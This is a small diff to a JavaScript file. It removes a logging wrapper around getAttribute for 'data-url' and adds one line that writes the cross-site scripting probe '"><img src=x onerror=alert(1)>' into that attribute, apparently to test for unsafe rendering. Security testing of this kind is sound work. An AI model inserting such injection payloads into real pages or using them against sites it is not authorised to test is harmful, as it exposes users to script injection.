@@ -1,17 +1,1 @@
-const originalGetAttribute = Element.prototype.getAttribute;
-
-Element.prototype.getAttribute = function(name) {
-  if (name === "data-url") {
-    try {
-      console.log(
-        "[getAttribute] data-url called on:",
-        this,
-        "value:",
-        originalGetAttribute.call(this, name)
-      );
-    } catch (e) {
-      console.warn("Error getting attribute:", e);
-    }
-  }
-  return originalGetAttribute.call(this, name);
-};
+document.querySelector('[data-url]').setAttribute("data-url", '"><img src=x onerror=alert(1)>');
